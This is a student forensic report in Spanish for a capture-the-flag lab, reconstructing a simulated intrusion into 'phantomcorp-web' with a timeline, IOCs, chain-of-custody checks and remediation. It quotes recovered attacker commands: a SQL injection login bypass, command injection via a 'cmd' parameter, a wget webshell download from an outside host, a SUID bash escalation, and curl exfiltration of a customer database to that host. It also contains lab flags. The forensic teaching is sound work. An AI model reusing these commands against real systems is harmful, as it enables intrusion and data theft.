# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 03 · **Investigadores:** Federico Sánchez — @Fedesan14 · Elian Enria — @elian-enria-id · Efraín Host — @hostefrain · Lohana Rumis — @Lohana-Rumis · **Fecha:** 2026-11-03
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración

## 0. Declaración de uso de IA

Claude Code (Anthropic, modelo Opus 5) para consultas varias durante el desarrollo (dudas conceptuales, dudas de sintaxis), ayuda para la redacción de algunas secciones del informe.
GitHub Copilot con modelo Claude Sonnet 5 para consultas varias durante el desarrollo (dudas conceptuales, dudas de sintaxis) y revisiones de código ya escrito.

## 1. Resumen del incidente

El 5 de septiembre de 2026, un atacante (185.220.101.42) escaneó `phantomcorp-web`, encontró un panel (`/portal-rrhh`) y lo entró con un bypass de login por inyección SQL (`admin'--`). Desde ahí leyó un archivo de configuración filtrado (`rrhh.conf`) que le dio un token de API, y con ese token ejecutó comandos arbitrarios en el servidor a través de un endpoint de reportes (`/api/reporte?cmd=`). Usó esa ejecución remota para descargar una webshell, entrar por SSH, escalar a root abusando de un binario SUID, instalar un usuario backdoor y persistencia por cron, y finalmente robar la base de clientes de la empresa, subiéndola a un servidor externo (45.13.37.7) por el mismo canal que usó como C2 (conexión `nc` en el puerto 4444). Antes de irse intentó borrar su historial de comandos y alteró el log de autenticación (`auth.log`) para tapar parte de su actividad; esto último se detectó porque su hash ya no coincide con el de la captura original.

## 2. Cadena de custodia

Verificamos la integridad de los 9 archivos de evidencia contra `caso/evidencia.sha256` con `shasum -c`. La corrida directa sobre los archivos tal como quedaron en este checkout de Git (en Windows) falla en los **9** archivos, pero no con un simple "hash distinto": `shasum` ni siquiera puede abrirlos.

```
$ cd labs/lab11-forensia/caso && shasum -a 256 -c evidencia.sha256
shasum: disco/etc/passwd.snippet: No such file or directory
disco/etc/passwd.snippet: FAILED open or read
shasum: disco/listado.txt: No such file or directory
disco/listado.txt: FAILED open or read
shasum: disco/var/www/uploads/shell.php.evidencia.txt: No such file or directory
disco/var/www/uploads/shell.php.evidencia.txt: FAILED open or read
shasum: logs/access.log: No such file or directory
logs/access.log: FAILED open or read
shasum: logs/auth.log: No such file or directory
logs/auth.log: FAILED open or read
shasum: memoria/bash_history.txt: No such file or directory
memoria/bash_history.txt: FAILED open or read
shasum: memoria/lsof.txt: No such file or directory
memoria/lsof.txt: FAILED open or read
shasum: memoria/netstat.txt: No such file or directory
memoria/netstat.txt: FAILED open or read
shasum: memoria/pslist.txt: No such file or directory
memoria/pslist.txt: FAILED open or read
shasum: WARNING: 9 listed files could not be read
```

Esto **no** es un hallazgo forense: `file evidencia.sha256` muestra que el propio manifiesto de hashes tiene terminadores de línea `CRLF` (lo mismo que los 9 archivos de evidencia). Git los normalizó así al clonar en Windows (`core.autocrlf`). Como `shasum` interpreta cada línea del manifiesto literalmente, el nombre de archivo que intenta abrir queda con un `\r` pegado al final (p. ej. `disco/listado.txt␍`), y ese archivo —con ese nombre exacto— no existe: de ahí el "No such file or directory" en los 9, no un fallo de hash. Es un artefacto de entorno, no una alteración de contenido. Para no contaminar la evidencia ni sacar una conclusión falsa, normalizamos manualmente cada archivo a `LF` **solo para el cálculo del hash** (sin escribir nada a disco ni depender del parseo de `shasum` del manifiesto) y repetimos la verificación:

```bash
$ while IFS= read -r line; do
    hash=$(echo "$line" | awk '{print $1}')
    file=$(echo "$line" | cut -d' ' -f2- | sed 's/^ *//')
    actual=$(tr -d '\r' < "$file" | sha256sum | awk '{print $1}')
    [ "$hash" = "$actual" ] && echo "OK      $file" || echo "FAILED  $file"
  done < evidencia.sha256

OK      disco/etc/passwd.snippet
OK      disco/listado.txt
OK      disco/var/www/uploads/shell.php.evidencia.txt
OK      logs/access.log
FAILED  logs/auth.log
OK      memoria/bash_history.txt
OK      memoria/lsof.txt
OK      memoria/netstat.txt
OK      memoria/pslist.txt
```

Tras normalizar, **8 de 9 archivos coinciden exactamente** con su hash de captura. El único que sigue fallando es **`logs/auth.log`**: su hash real no coincide con el registrado (`evidencia.sha256:5`), lo que aísla el problema real del artefacto de checkout. El propio archivo lo confirma: trae un comentario del equipo de respuesta señalando la discrepancia y un comentario del atacante marcando las líneas que borró (`auth.log:5-8`):

```
# --- lineas eliminadas por el atacante ---
# nota del forense: el hash de este archivo NO coincide con el de la custodia.
# alguien lo edito despues de la captura. marcador recuperado del journal:
# FLAG{dfir_custodia_alterada}
```

**Qué implica:** no podemos afirmar nada sobre lo que decían las líneas que faltan entre el evento de escalada SUID (`auth.log:4`, 02:21:04) y el cierre de la conexión SSH (`auth.log:9`, 02:45:00) — esa ventana de ~24 minutos quedó en blanco porque el atacante la editó, y un archivo alterado no permite rellenar ese hueco con una suposición. Lo que sí podemos sostener es lo que las líneas *restantes* de `auth.log` dicen, porque cada una está corroborada por una fuente independiente que el atacante no tocó (ver sección 3): el login SSH (`auth.log:2`) encaja con la IP y la ventana horaria del resto del ataque; el intento de `sudo` fallido (`auth.log:3`) es consistente con que el atacante necesitara otra vía (el SUID) para escalar; y el evento de auditoría del kernel sobre el SUID exec (`auth.log:4`) coincide en minuto exacto con el proceso `system-check` visto vivo en memoria (`pslist.txt:8`) y con el comando que lo disparó en el historial recuperado (`bash_history.txt:6`). Documentamos la discrepancia en vez de ignorarla: por eso la evidencia de `auth.log` se usa con esa reserva explícita en todo el resto del informe.

## 3. Línea de tiempo del ataque

| Hora (UTC) | Evento | Evidencia (archivo:línea) |
|---|---|---|
| 02:14:03–02:14:22 | Reconocimiento y enumeración desde 185.220.101.42: banner grab (`zgrab`) y fuerza bruta de directorios (`gobuster`) que encuentra `/portal-rrhh` y `/uploads` | `access.log:6-12` |
| 02:16:40–02:16:58 | Dos intentos de login fallidos contra `/portal-rrhh/login` (401) | `access.log:14-15` |
| 02:17:22 | Login exitoso (200) con payload de inyección SQL `user=admin'--` — bypass de autenticación | `access.log:16` |
| 02:17:41 | Lectura de `/backup/rrhh.conf`, un archivo de configuración expuesto que filtra el token de API usado después | `access.log:17` |
| 02:18:10 | Primer comando remoto vía `/api/reporte?token=phantom-api-7c1e&cmd=id` — confirma RCE | `access.log:18` |
| 02:18:33 | Marcador de RCE: `cmd=echo FLAG{dfir_vector_sqli} > /tmp/.p` (decodificado de URL) | `access.log:19` → corroborado en disco: `/tmp/.p` creado a las 02:18, 12 bytes (`listado.txt:3`) |
| 02:19:02 | Vía el mismo RCE, descarga la webshell: `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php` | `access.log:20` → disco: `shell.php` creado a las 02:19, 431 bytes (`listado.txt:4`) → memoria: conexión saliente a `45.13.37.7:80` en `TIME_WAIT`, proceso `wget` PID 1201 (`netstat.txt:5`), mismo PID como `sh -c wget ...` en `pslist.txt:6` |
| 02:19:48 | Primer acceso a la webshell ya dropeada: `GET /uploads/shell.php?c=whoami` | `access.log:21` → webshell confirmada en disco, con comentario del atacante y RCE vía `?c=` (`shell.php.evidencia.txt:7-8`) |
| 02:19:55 | Login SSH como `www-data` desde la misma IP atacante (acceso interactivo) | `auth.log:2` |
| 02:20:31 | Intento de `sudo` fallido (`command not allowed`) — el atacante prueba escalar por la vía obvia y falla | `auth.log:3` |
| 02:21:04 | Escalada real: ejecución del binario SUID `/usr/local/bin/system-check` con `euid=0` (evento de auditoría del kernel) | `auth.log:4` → disco: binario creado a las 02:21, 1.113.504 bytes, "copia de bash" (`listado.txt:5`) → memoria: PID 1477 `system-check`, `euid=0`, corriendo al momento de la captura (`pslist.txt:8`) → memoria: comando que lo disparó, `/usr/local/bin/system-check -p -c 'id'` (`bash_history.txt:6`), confirmado con el marcador `echo FLAG{dfir_privesc_suid}` (`bash_history.txt:7`) |
| 02:22 | Instalación de persistencia: `/etc/cron.d/phantom-maint`, que relanza la webshell cada 5 minutos | `listado.txt:6` → referenciado también en `shell.php.evidencia.txt:9` |
| 02:23:15 | Exfiltración vía webshell: `GET /uploads/shell.php?c=cat /app/priv/clientes.db.txt`, respuesta de **48.210 bytes** | `access.log:22` → disco: `/tmp/.exfil/clientes.tar.gz`, **48.210 bytes** (mismo tamaño), creado a las 02:23 (`listado.txt:7`) → memoria: comando `tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt` (`bash_history.txt:8`) y el archivo abierto por `bash` PID 1240 (`lsof.txt:5`) |
| ~02:23 | Subida de los datos robados al servidor externo: `curl -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}` | `bash_history.txt:9` → canal C2 visible en memoria: conexión `ESTABLISHED` a `45.13.37.7:4444` del proceso `nc` (`netstat.txt:4`), PID 1490 (`pslist.txt:9`), con el socket abierto (`lsof.txt:3`) |
| (posterior) | El atacante intenta cubrir sus huellas: `history -c` — pero la sesión `bash` (PID 1240) seguía viva en memoria al momento de la captura, por lo que el historial se recuperó igual | `bash_history.txt:10` (ver P1 y P4) |
| 02:45:00 | Cierre de la conexión SSH del atacante | `auth.log:9` |
| (posterior a la captura) | Alteración de `auth.log`: detectada por fallo de hash contra la cadena de custodia (ver sección 2) | `evidencia.sha256:5` vs. recómputo; `auth.log:5-8` |

## 4. Indicadores de compromiso (IOCs)

| Tipo | Valor | Dónde apareció |
|---|---|---|
| IP atacante | `185.220.101.42` | `access.log:6-22` (todo el ataque HTTP); `auth.log:2,9` (sesión SSH) |
| IP/puerto C2 | `45.13.37.7:4444` (reverse shell/C2, proceso `nc`, conexión `ESTABLISHED`) — el mismo host sirvió también la webshell por `:80` y recibió la exfiltración en `/upload` | `netstat.txt:4-5`; `pslist.txt:9`; `lsof.txt:3`; `bash_history.txt:4,9` |
| Archivo malicioso | `/var/www/uploads/shell.php` (webshell con RCE vía `?c=`, descargada de `45.13.37.7/s.php`) | `shell.php.evidencia.txt:1,6-8`; creado a las 02:19, 431 bytes (`listado.txt:4`) |
| Usuario backdoor | `phantom-svc` (UID/GID `0`, shell `/bin/bash` — cuenta con privilegios de root agregada por el atacante) | `passwd.snippet:3-4` |
| Persistencia | `/etc/cron.d/phantom-maint` (relanza la webshell cada 5 minutos) | `listado.txt:6`; referenciado en `shell.php.evidencia.txt:9` |

**Nota:** todos los IOCs de esta tabla están respaldados por al menos un archivo de evidencia citado; no incluimos ningún valor (IP, puerto, hash, usuario) que no aparezca literalmente en `caso/`.

## 5. Alcance del daño

El atacante exfiltró la base de clientes de la empresa (`/app/priv/clientes.db.txt`, empaquetada en `/tmp/.exfil/clientes.tar.gz`, 48.210 bytes) hacia `45.13.37.7`. Dejó **tres mecanismos de persistencia/acceso** que sobreviven al cierre de su sesión SSH (`auth.log:9`, 02:45:00):

1. La webshell en disco (`/var/www/uploads/shell.php`), accesible sin autenticación vía HTTP.
2. Un cron (`/etc/cron.d/phantom-maint`) que la relanza cada 5 minutos si se la elimina.
3. Un usuario backdoor con privilegios de root (`phantom-svc`) en `/etc/passwd`.

Por lo tanto, aunque no haya una sesión interactiva abierta en el momento de la captura, **el atacante conserva al menos tres caminos de reingreso**, dos de ellos (webshell + cron) completamente automáticos. También queda expuesto el binario SUID falsificado (`/usr/local/bin/system-check`, copia de `bash` con bit SUID), utilizable para escalar a root por cualquiera con acceso de `www-data`. El token de API filtrado (`phantom-api-7c1e`) y cualquier credencial que haya en `rrhh.conf` deben considerarse comprometidos.

## 6. Contención y erradicación (recomendaciones)

**Cerrar el vector:**
- Arreglar la inyección SQL en `/portal-rrhh/login` (consultas parametrizadas, no concatenación).
- Retirar o restringir `/backup/rrhh.conf` (archivo de configuración expuesto sin autenticación).
- Deshabilitar/reescribir `/api/reporte`: no debe aceptar un parámetro `cmd` que se ejecute en el sistema.

**Matar procesos activos (si la sesión sigue viva):**
- `kill` de los PIDs identificados en memoria: 1490 (`nc`, C2), 1477 (`system-check`, SUID), 1240 (`bash` del atacante), 1201 (`wget`) si todavía corren.

**Remover persistencia:**
- Borrar `/var/www/uploads/shell.php`.
- Borrar `/etc/cron.d/phantom-maint`.
- Borrar el binario falsificado `/usr/local/bin/system-check` (o restaurar el `system-check` legítimo desde un backup confiable, sin el bit SUID).
- Eliminar el usuario backdoor `phantom-svc` de `/etc/passwd`.

**Rotar credenciales:**
- Token de API `phantom-api-7c1e`.
- Cualquier credencial contenida en `rrhh.conf`.
- Contraseña de `www-data` y revisión de todas las claves/contraseñas de `root` del host, dado que hubo escalada confirmada.

**Bloquear IOCs:**
- Bloquear en firewall/WAF las IPs `185.220.101.42` y `45.13.37.7` (los dos puertos usados, 80 y 4444).

**Otras acciones:**
- Notificar la exfiltración de datos de clientes según corresponda (posible obligación legal de notificación de brecha).
- Dado que hubo escalada a root confirmada, evaluar reinstalar el host desde una imagen limpia en vez de confiar en una limpieza manual (no se puede descartar un backdoor adicional no detectado en esta evidencia).
- Preservar y re-hashear toda la evidencia original (incluyendo una imagen forense completa, si todavía no existe) antes de remediar, para no destruir pruebas si el caso continúa por vía legal.

## 7. Preguntas de análisis (P1–P5)

**P1. ¿Por qué la RAM se captura antes que el disco? Dá un ejemplo de este caso donde la memoria tenía algo que el disco ya no.**

Porque la RAM es la fuente más volátil: se pierde apenas se apaga o reinicia la máquina, mientras que el disco persiste. Si el orden de captura se invierte, se puede perder evidencia irrecuperable. En este caso el ejemplo es literal: el atacante corrió `history -c` (`bash_history.txt:10`) para borrar su historial en disco. Pero el proceso `bash` de su sesión (PID 1240) seguía vivo en el momento de la captura de memoria (`pslist.txt:7`), así que el historial de comandos —incluido el que prueba el RCE, el de la escalada SUID y el de la exfiltración al C2— se recuperó igual desde la RAM (`memoria/bash_history.txt`, explícitamente etiquetado "recuperado de memoria, el del disco fue borrado por el atacante"). Si solo se hubiera capturado el disco después de apagar el servidor, ese historial se habría perdido para siempre.

**P2. El R5: ¿cómo supiste que el archivo fue alterado? ¿Por qué eso invalida la evidencia si no se documenta?**

Lo detallamos en la sección 2: `shasum -c` contra `evidencia.sha256` "falla" en los 9 archivos en bruto por un artefacto de checkout (CRLF de Windows), así que normalizamos a `LF` antes de comparar; tras normalizar, 8 de 9 archivos coinciden exactamente y **solo** `logs/auth.log` sigue fallando — eso separa el tampering real de un artefacto de entorno, en vez de reportar "9 archivos alterados" (lo cual habría sido un hallazgo falso). `auth.log` además trae un comentario interno que confirma la alteración y el marcador recuperado (`FLAG{dfir_custodia_alterada}`, `auth.log:5-8`).

Por qué invalida la evidencia si no se documenta: la integridad de un archivo es binaria (coincide con su hash de captura o no), no hay "coincide casi". Si no se documenta la discrepancia, cualquier conclusión basada en ese archivo queda sin sustento, porque ya no se puede distinguir el contenido original del editado — y, peor, un analista o un juez podría tomar como verdad algo que el propio atacante escribió para desviar la investigación. En este caso mitigamos el riesgo porque los hechos relevantes de `auth.log` que sí usamos (login SSH, intento de sudo, evento SUID) están corroborados independientemente por memoria y disco; pero lo que el atacante borró (las líneas faltantes entre las 02:21 y las 02:45) queda como una laguna documentada, no como un hecho que inventamos.

**P3. Correlacioná tres artefactos (log + disco + memoria) que apunten al MISMO evento con el mismo timestamp.**

El evento de exfiltración (~02:23) es el ejemplo más contundente porque además de la hora coincide un **número exacto**: la respuesta HTTP de `GET /uploads/shell.php?c=cat /app/priv/clientes.db.txt` en el log mide **48.210 bytes** (`access.log:22`); el archivo preparado para exfiltrar en disco, `/tmp/.exfil/clientes.tar.gz`, creado a las 02:23, mide exactamente **48.210 bytes** también (`listado.txt:7`); y en memoria, el comando que generó ese mismo archivo (`tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt`) está en el historial recuperado (`bash_history.txt:8`), con el archivo todavía abierto por el proceso `bash` del atacante en el momento de la captura (`lsof.txt:5`). Cuatro fuentes — log, disco, memoria (comando) y memoria (proceso) — coinciden en el mismo minuto y, dos de ellas, en el mismo número de bytes.

**P4. El atacante corrió `history -c`. ¿Por qué igual pudiste recuperar sus comandos?**

Porque `history -c` limpia el historial en memoria del proceso `bash` actual y lo que ya estaba escrito en el archivo `.bash_history` en disco, pero no borra retroactivamente comandos que un volcado de memoria capturado **antes** de ese momento (o de un proceso que siga vivo) ya haya registrado. En este caso, el equipo de respuesta extrajo el historial de la sesión directamente de la RAM mientras el proceso `bash` (PID 1240) todavía estaba vivo (`pslist.txt:7`), antes de que la máquina se apagara o el proceso terminara. Por eso `memoria/bash_history.txt` contiene comandos que ya no están en el disco: el `history -c` llegó tarde, después de que la evidencia relevante ya había sido capturada desde la fuente más volátil (Ejemplo A del README: "la RAM no miente").

**P5. Cierre del curso: ¿por qué un buen forense tiene que entender cómo ataca un pentester?**

Porque reconstruir una línea de tiempo y reconocer IOCs requiere saber qué aspecto tiene cada fase de un ataque real. Sin haber hecho los labs de recon, SQLi, RCE y escalada, no se reconocería que dos 401 seguidos de un 200 con `admin'--` es un bypass de autenticación por inyección SQL, ni que un binario con el mismo tamaño "sospechoso" de una shell y bit SUID es una escalada clásica, ni que una conexión `ESTABLISHED` hacia un puerto no estándar (4444) es casi siempre un reverse shell. El conocimiento ofensivo le da al forense el diccionario de patrones necesario para leer la evidencia en vez de solo mirarla. Es la misma idea del Lab 10 (red y blue comparten un modelo mental), llevada un paso más allá: acá el forense hace el mismo trabajo de correlación que hace un analista de SOC, pero después del hecho y con material más rico (disco y memoria, no solo logs). Atacar, evadir detección e investigar después son la misma disciplina, vista en tres momentos distintos de la misma historia — y ese es, en definitiva, el cierre del curso.

---

## Anexo A — Flags capturadas (salida de `./ctf status 11`)

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 11                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Vector de entrada (SQLi -> RCE) en los logs
   ✓  R2     El webshell dropeado en el disco
   ✓  R3     Escalada de privilegios (SUID) en memoria
   ✓  R4     Conexion C2 y exfiltracion de datos
   ✓  R5     Cadena de custodia: evidencia alterada

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 11 COMPLETO! Ponete las pilas con la próxima unidad.
```

## Anexo B — `src/timeline.py` (ampliación opcional)

Completamos `construir_timeline()` (parsea el log con `parsear_linea()`, descarta las líneas que no matchean y filtra por IP) y `clasificar_fase()` (etiqueta cada ruta según la fase del ataque: RECON, ENUM, EXPLOIT, RCE, WEBSHELL, EXFIL). El código vive en `src/timeline.py` de esta entrega.

```bash
$ cd src && python3 timeline.py ../../../../labs/lab11-forensia/caso/logs/access.log --ip 185.220.101.42
[*] 16 eventos de 185.220.101.42
  05/Sep/2026:02:14:03 +0000  GET  /                                        [RECON]
  05/Sep/2026:02:14:19 +0000  GET  /robots.txt                              [RECON]
  05/Sep/2026:02:14:20 +0000  GET  /admin                                   [ENUM]
  05/Sep/2026:02:14:20 +0000  GET  /login                                   [ENUM]
  05/Sep/2026:02:14:21 +0000  GET  /backup                                  [ENUM]
  05/Sep/2026:02:14:21 +0000  GET  /portal-rrhh                             [ENUM]
  05/Sep/2026:02:14:22 +0000  GET  /uploads                                 [ENUM]
  05/Sep/2026:02:16:40 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:16:58 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:22 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:41 +0000  GET  /backup/rrhh.conf                        [EXPLOIT]
  05/Sep/2026:02:18:10 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=id [RCE]
  05/Sep/2026:02:18:33 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p [RCE]
  05/Sep/2026:02:19:02 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php [RCE]
  05/Sep/2026:02:19:48 +0000  GET  /uploads/shell.php?c=whoami              [WEBSHELL]
  05/Sep/2026:02:23:15 +0000  GET  /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt [EXFIL]
```

La salida de la herramienta reproduce exactamente la secuencia armada a mano en la sección 3 (recon → enumeración → explotación → RCE → webshell → exfiltración), lo que sirvió como segunda verificación independiente de la línea de tiempo.

**Nota de alcance:** todo el análisis de este informe se hizo exclusivamente sobre los archivos de `labs/lab11-forensia/caso/` (en modo lectura) y sobre la copia de `src/timeline.py` dentro de esta entrega; no se modificó ningún archivo de evidencia original.
